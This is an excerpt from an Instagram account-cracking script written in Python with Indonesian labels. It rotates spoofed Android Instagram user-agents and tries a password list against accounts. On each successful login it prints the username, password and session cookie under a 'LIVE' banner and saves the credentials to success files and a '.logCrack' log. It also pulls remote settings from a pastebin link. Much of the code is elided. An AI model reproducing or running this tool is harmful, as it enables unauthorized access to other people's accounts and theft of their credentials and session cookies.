...
class instagram:
	...
	def ua_baru(self):
		...
		igv=self.vers()
		ua = rc([
		f"Instagram {igv} Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)",
		...
		f"Instagram {igv} Android (29/10; 476dpi; 1440x2646; Google/google; Pixel 3 XL; crosshatch; crosshatch; en_US; 219308763)",
		f"Instagram {igv} Android (28/9; 420dpi; 1080x2131; samsung; SM-A505FN; a50; exynos9610; fi_FI; 221134032)",
		f"Instagram {igv} Android (32/13; 320dpi; 2400x1080; Realme; RMX3610; marlin; qcom; in_ID; 458229219)",
		f"Instagram {igv} Android (28/9; 160dpi; 800x1232; mediacom; 1CY; 1CY; mt8321; it_IT; 494078129)",
		f"Instagram {igv} Android (33/13; 420dpi; 1080x2106; Google/google; Pixel 7 Pro; cheetah; cheetah; en_US; 488780866)",
		f"Instagram {igv} Android (28/9; 480dpi; 1080x2052; IRIS; N30; N30; mt6763; ar_DZ; 483850214)",
		f"Instagram {igv} Android (28/9; 213dpi; 800x1216; Amazon; KFONWI; onyx; mt8168; pt_BR; 488780828)",	
		f"Instagram {igv} Android (25/7.1.1; 240dpi; 480x854; ZTE; Z855; calbee; qcom; en_US; 301484472)",
		f"Instagram {igv} Android (30/11; 320dpi; 720x1505; Xiaomi/Redmi; 220333QBI; fog; qcom; pt_BR; 491057553)",
		f"Instagram {igv} Android (10.0.0; RQ2A.210405.005; 440dpi; 1080x1920; Google/Pixel; Pixel 2; walleye; Qualcomm Snapdragon 835; en_US; 252888000)",
		f"Instagram {igv} Android (25/7.1.1; 240dpi; 480x854; ZTE; Z851M; jeff; qcom; en_US; 491057537)",
		f"Instagram {igv} Android (28/9; 213dpi; 800x1216; Amazon; KFONWI; onyx; mt8168; es_ES; 488780816)",
		f"Instagram {igv} Android (24/7.0; 480dpi; 1920x1080; samsung; SM-G930F; herolte; samsungexynos8890; ru_UA; 98288242)",
		f"Instagram {igv} Android (26/8.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; de_DE; 98288242)",
		f"Instagram {igv} Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; ru_RU; 98288242)",
		f"Instagram {igv} Android (24/7.0; 320dpi; 720x1280; samsung; SM-J701F; j7velte; samsungexynos7870; uk_UA; 98288239)",
		f"Instagram {igv} Android (23/6.0; 480dpi; 1080x1920; Xiaomi; Redmi Note 3; kenzo; qcom; uk_UA; 98288242)"])
		return ua
	def ua_ran(self):
		...
		for pw in pas:
				try:
					...
					if "logged_in_user" in str(ncek):
						...
						try:
							print("")
							prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}\nCookie : {cokis}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
...
if __name__=='__main__':
	...
	try:
		...
		HARIS1.update(ko)
		ki = ses.get('https://pastebin.com/raw/dLb8AXSR').json()
		HARIS.update(ki)
	except Exception as e:
		prints(e)
	login_kamu()